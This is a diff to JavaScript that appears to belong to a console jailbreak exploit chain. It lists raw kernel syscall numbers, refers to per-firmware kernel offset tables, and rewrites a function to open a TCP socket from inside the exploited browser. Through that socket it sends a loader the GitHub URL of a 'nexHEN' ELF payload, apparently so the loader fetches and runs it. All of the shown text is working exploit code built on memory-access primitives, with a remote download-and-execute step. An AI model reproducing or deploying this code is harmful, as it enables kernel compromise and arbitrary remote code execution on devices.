@@ -36,12 +36,19 @@
 
 import { int64 } from "./int64.js";
 
+
 const S = {
-  open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
-  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, thr_self: 432,
-  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
-  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
+  open: 5, close: 6, write: 4, ioctl: 54,
+  mprotect: 74, socket: 97, connect: 98,
+  setsockopt: 105, getuid: 24,
+  kqueue: 362, kevent: 363, mmap: 477,
+  thr_self: 432, getpid: 20, sysctl: 202,
+  cpuset_getaffinity: 487,
+  cpuset_setaffinity: 488,
+  dynlib_get_list: 592,
+  dynlib_get_info: 593,
 };
+
 
 /* Offsets into the kernel image, one table per firmware. Everything that
    moved between 13.52 and 14.00 lives here; everything that did not is
@@ -1280,17 +1287,77 @@ async function loadElfLoader(url) {
 const NEXHEN_RC6_URL =
   "https://raw.githubusercontent.com/CrispyKilledIt/afterglow/main/nexHEN.-rc6-codxelf.elf";
 
+
 async function sendNexHENToElfLoader() {
-  const payloadURL =
-    "http://192.168.1.102:9021/?uri=" +
-    encodeURIComponent(NEXHEN_RC6_URL);
+  let fd = -1;
 
-  say("[elfldr] navigating directly to ELF loader");
-  say("[elfldr] sending NexHEN RC6");
+  try {
+    say("[elfldr] opening TCP connection");
 
-  window.location.assign(payloadURL);
-  return true;
+    fd = sc(S.socket, 2, 1, 0).i32;
+    if (fd < 0) {
+      say("[elfldr] socket creation failed: " + fd);
+      return false;
+    }
+
+    const addr = alloc(16);
+    addr.u8.set([
+      16, 2, 0x23, 0x3d,
+      127, 0, 0, 1,
+      0, 0, 0, 0, 0, 0, 0, 0
+    ]);
+
+    const connected = sc(S.connect, fd, addr.at, 16).i32;
+
+    if (connected !== 0) {
+      say("[elfldr] TCP connect failed: " + connected);
+      return false;
+    }
+
+    say("[elfldr] connected to local loader");
+
+    const url = NEXHEN_RC6_URL + "\n";
+    const bytes = new Uint8Array(url.length);
+
+    for (let i = 0; i < url.length; i++) {
+      bytes[i] = url.charCodeAt(i);
+    }
+
+    const data = alloc(bytes.length);
+    wrbuf(data.at, bytes);
+
+    let sent = 0;
+
+    while (sent < bytes.length) {
+      const count = sc(
+        S.write,
+        fd,
+        plus(data.at, sent),
+        bytes.length - sent
+      ).i32;
+
+      if (count <= 0) {
+        say("[elfldr] TCP write failed: " + count);
+        return false;
+      }
+
+      sent += count;
+    }
+
+    say("[elfldr] NexHEN URL sent successfully");
+    return true;
+
+  } catch (e) {
+    say("[elfldr] sender error: " + String(e));
+    return false;
+
+  } finally {
+    if (fd >= 0) {
+      sc(S.close, fd);
+    }
+  }
 }
+
 
 
 
